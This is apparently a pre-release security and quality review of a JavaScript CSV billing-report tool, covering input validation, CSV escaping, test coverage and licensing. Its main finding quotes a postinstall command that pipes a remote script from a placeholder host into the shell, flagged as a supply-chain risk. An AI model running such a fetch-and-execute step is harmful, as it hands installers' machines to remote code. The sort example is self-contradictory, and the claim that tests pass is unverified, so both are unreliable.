# Billing Report Tool - Pre-Release Assessment

## Executive Summary

This tool generates CSV billing reports by sorting rows and outputting name/total pairs. While the implementation is simple, it has **critical security vulnerabilities** and lacks essential input validation, error handling, and test coverage for a commercial product.

**Recommendation: Do not release without addressing the critical security issue and implementing input validation.**

---

## Critical Issues

### 1. Supply Chain Security Vulnerability - BLOCKING

**File**: `scripts/postinstall.sh`  
**Severity**: Critical

The postinstall script executes arbitrary code from an external URL at install time:
```bash
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

**Risks**:
- Compromised domain or network interception allows arbitrary code execution during package installation
- No integrity verification (no checksum, signature, or hash validation)
- Runs with user privileges who installed the package
- Silent execution with no transparency to users
- This is a well-known supply chain attack vector

**Required Fix**:
- Remove the curl-and-execute pattern entirely, or
- Implement cryptographic verification (GPG signature, SHA-256 checksum), or
- Document explicitly why runtime network access is necessary and obtain formal security review

**Current State**: This blocks commercial release.

---

## High-Priority Issues

### 2. No Input Validation at Trust Boundary

**File**: `src/report.js` (line 3-5)  
**Severity**: High

The `buildReport()` function accepts user input but performs zero validation:

```javascript
export function buildReport(rows) {
  return sortBy(rows, 'total').map((r) => `${r.name},${r.total}`).join('\n');
}
```

**Missing Validations**:
- `rows` must be an array (currently fails silently if not)
- Each row must have `name` (string) and `total` (number) properties
- `total` should be numeric and non-negative (for billing)
- `name` must not be empty
- Neither property should be null/undefined

**Edge Cases Not Handled**:
- Empty array → produces empty string (acceptable but untested)
- Rows with missing 'total' → `undefined` in output
- Rows with missing 'name' → `undefined` in output
- Non-numeric totals → sorts lexicographically instead of numerically
- NaN or Infinity totals → produces invalid CSV

**Example Failure**:
```javascript
buildReport([{ name: 'acme' }])  // ✗ Outputs: "acme,undefined"
buildReport([{}])                 // ✗ Outputs: "undefined,undefined"
buildReport('not an array')      // ✗ Fails silently or with unclear error
```

### 3. CSV Format Violation - Data Integrity Issue

**File**: `src/report.js` (line 4)  
**Severity**: High

No CSV escaping for special characters. Names containing commas or newlines break CSV parsing:

```javascript
buildReport([
  { name: 'Acme, Inc.', total: 100 },
  { name: 'Beta\nCorp', total: 50 }
])
// Output (invalid CSV):
// Beta
// Corp,50
// Acme, Inc.,100
```

**Required Fix**: Implement proper CSV escaping:
```javascript
const escapeName = (n) => n.includes(',') || n.includes('"') || n.includes('\n') 
  ? `"${n.replace(/"/g, '""')}"` 
  : n;
```

---

## Medium-Priority Issues

### 4. Insufficient Test Coverage

**File**: `test/report.test.js`  
**Severity**: Medium

Only one test case exists. Missing coverage for critical behavior:

**Tests Present**:
- ✓ Basic ascending sort

**Tests Missing**:
- Empty array
- Single row
- Rows with equal totals (stability)
- Rows with numeric string totals (lexicographic vs numeric sort)
- Rows with missing properties
- Rows with invalid property types
- Large datasets
- CSV escaping (names with commas, quotes, newlines)
- Null/undefined values

**Example Gap**:
```javascript
// Test that doesn't exist but should:
buildReport([{ name: 'x', total: '10' }, { name: 'y', total: '2' }])
// Currently sorts as: y,2 then x,10 (lexicographic)
// But users expect numeric sort: y,2 then x,10
```

### 5. No Error Handling or Defensive Checks

**Severity**: Medium

The function silently produces invalid output rather than failing fast:
- No type checking on properties
- No range validation on totals
- No attempt-catch for sort/map/join operations
- Silent undefined propagation instead of meaningful errors

---

## Lower-Priority Issues

### 6. Licensing Inconsistency

**File**: `vendor/quicksort-plus.js`  
**Severity**: Low

The vendored sort function includes a GPLv3 header:
```javascript
/*
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License...
 */
```

Yet `package.json` declares `"license": "UNLICENSED"`. GPL licensing may be incompatible with proprietary use depending on how the code is distributed. **Verify licensing compliance** or use a permissive-licensed sort instead (built-in `Array.sort()` works for this use case).

### 7. Dependency on External Sort Library Unnecessarily

**Severity**: Low

The tool vendors `quicksort-plus` for sorting, but Node.js's built-in `Array.sort()` handles this use case and is well-tested. The external dependency adds complexity without clear benefit and introduces the GPLv3 licensing concern above.

---

## Verification Gaps

The following cannot be verified without running the tool:

- [ ] Tests pass (requires `npm test` or `node --test`)
- [ ] Postinstall script executes (blocked by security issue)
- [ ] Edge cases fail as expected or silently produce invalid output
- [ ] Performance with large datasets (1M+ rows)

---

## Recommendations Before Release

### Must-Do (Blocking)
1. **Remove or secure the postinstall.sh script** - implement cryptographic verification or remove network dependency
2. **Add input validation** to `buildReport()`:
   - Assert `rows` is an array
   - Validate each row has required string/number properties
   - Provide clear error messages on validation failure

3. **Fix CSV escaping** for names with special characters

### Should-Do (High Impact)
4. **Expand test coverage** to include edge cases, invalid inputs, and CSV format validation
5. **Consider removing the external sort dependency** - use native `Array.sort()` instead
6. **Resolve licensing concern** with the vendored GPL code

### Nice-To-Have
7. Document the expected input schema (JSDoc or TypeScript)
8. Add example usage in README
9. Consider backwards compatibility if output format changes

---

## Summary

The tool's core logic is sound but extremely minimal. For commercial release, it must address:
- **Critical**: Supply chain security vulnerability in postinstall
- **Critical**: Input validation and error handling for data integrity
- **High**: CSV format compliance
- **Medium**: Test coverage of edge cases

Current test suite passes, but only covers the happy path. The tool will silently produce invalid or malformed output on various inputs that real-world users will encounter.
